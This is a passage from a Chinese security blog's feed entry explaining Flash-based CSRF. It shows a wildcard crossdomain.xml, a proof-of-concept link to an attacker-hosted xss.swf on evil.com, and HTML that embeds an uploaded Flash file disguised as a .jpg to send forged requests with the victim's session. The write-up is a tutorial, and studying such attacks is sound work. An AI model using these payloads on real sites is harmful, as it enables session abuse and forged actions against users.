&lt;h2 id=&quot;crossdomain-xml-配置不当时直接请求&quot;&gt;&lt;a href=&quot;#crossdomain-xml-配置不当时直接请求&quot; class=&quot;headerlink&quot; title=&quot;crossdomain.xml 配置不当时直接请求&quot;&gt;&lt;/a&gt;crossdomain.xml 配置不当时直接请求&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;cross-domain-policy&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;allow-access-from domain=&amp;quot;*&amp;quot; /&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/cross-domain-policy&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面的 crossdomain.xml 文件配置允任何域的 Flash 对本域发起 HTTP 请求，危害非常大。&lt;br&gt;hi.php:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;?php&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    if ($_COOKIE[&amp;apos;user&amp;apos;]==&amp;apos;admin&amp;apos;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        echo &amp;quot;hi, admin.&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    else &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        echo &amp;quot;you need to login.&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;?&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;POC：&lt;a href=&quot;http://evil.com/xss.swf?a=get&amp;amp;c=http://localhost/hi.php&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://evil.com/xss.swf?a=get&amp;amp;c=http://localhost/hi.php&lt;/a&gt; Firebug 下可以看到，我们成功继承浏览器会话，请求了 localhost 域的 hi.php&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2014/05/28/something-about-flash-csrf-1.png&quot; alt=&quot;图 1&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;crossdomain-xml-配置正确，从本域-Flash-发起请求&quot;&gt;&lt;a href=&quot;#crossdomain-xml-配置正确，从本域-Flash-发起请求&quot; class=&quot;headerlink&quot; title=&quot;crossdomain.xml 配置正确，从本域 Flash 发起请求&quot;&gt;&lt;/a&gt;crossdomain.xml 配置正确，从本域 Flash 发起请求&lt;/h2&gt;&lt;p&gt;重新配置crossdomain.xml，限制允许 localhost 域的 Flash 请求。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;cross-domain-policy&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;allow-access-from domain=&amp;quot;localhost&amp;quot; /&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/cross-domain-policy&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这时我们可以向目标站点上传 Flash 文件，通过 HTML 中的 object 和 embed 标签引用上传的 Flash 发起请求(注意，我们上传的文件不一定是 swf 后缀，和 script 标签类似，不一定要求是 js 后缀。)。POC:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;head&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;title&amp;gt;FlashCSRF POC&amp;lt;/title&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/head&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;body&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;object classid=&amp;quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&amp;quot; codebase=&amp;quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0&amp;quot; width=&amp;quot;500&amp;quot; height=&amp;quot;500&amp;quot; id=&amp;quot;FlashVars&amp;quot; align=&amp;quot;middle&amp;quot;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;paramname=&amp;quot;allowScriptAccess&amp;quot; value=&amp;quot;always&amp;quot;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;paramname=&amp;quot;movie&amp;quot; value=&amp;quot;http://localhost/xss.jpg&amp;quot; /&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;paramname=&amp;quot;FlashVars&amp;quot; value=&amp;quot;a=get&amp;amp;c=http://localhost/hi.php&amp;quot;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;paramname=&amp;quot;quality&amp;quot; value=&amp;quot;high&amp;quot; /&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;embed src=&amp;quot;http://localhost/xss.jpg&amp;quot; quality=&amp;quot;high&amp;quot; bgcolor=&amp;quot;#ffffff&amp;quot; width=&amp;quot;500&amp;quot; height=&amp;quot;500&amp;quot; name=&amp;quot;FlashVars&amp;quot; align=&amp;quot;middle&amp;quot; allowScriptAccess=&amp;quot;always&amp;quot; FlashVars=&amp;quot;a=get&amp;amp;c=http://localhost/hi.php&amp;quot; type=&amp;quot;application/x-shockwave-flash&amp;quot; pluginspage=&amp;quot;http://www.macromedia.com/go/getflashplayer&amp;quot;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;/object/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/body&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/html&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;a href=&quot;http://evil.com/poc.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://evil.com/poc.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2014/05/28/something-about-flash-csrf-2.png&quot; alt=&quot;图 2&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里的 object 标签内嵌 embed 标签是为了兼容大多数浏览器。通过 Flash 从本域发起的请求可以绕过一些限制，如 referer 等。&lt;/p&gt;
&lt;p&gt;References：&lt;br&gt;&lt;a href=&quot;http://www.80sec.com/csrf-with-flash.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.80sec.com/csrf-with-flash.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://dushii.blog.163.com/blog/static/173051932009413104931351/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://dushii.blog.163.com/blog/static/173051932009413104931351/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;update 2014/06/04&lt;br&gt;这篇文章里面的技巧非常 Nice~&lt;br&gt;&lt;a href=&quot;http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website&quot;&gt;http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;看到 ping0s 在 FB 上放出了关于 Flash CSRF 的一些东西，也来聊一聊，just share.&lt;/p&gt;
&lt;p&gt;Flash CSRF 通常是由于 crossdomain.xml 配置不当造成的，利用方法是使用 swf 文件跨域发起请求。当 crossdomain.xml 配置得当时，我们也可以从目标站点发起伪造请求。&lt;br&gt;
    
    </summary>
    
      <category term="Pentest" scheme="http://sh3ll.me/categories/Pentest/"/>
    
    
  </entry>
  
</feed>
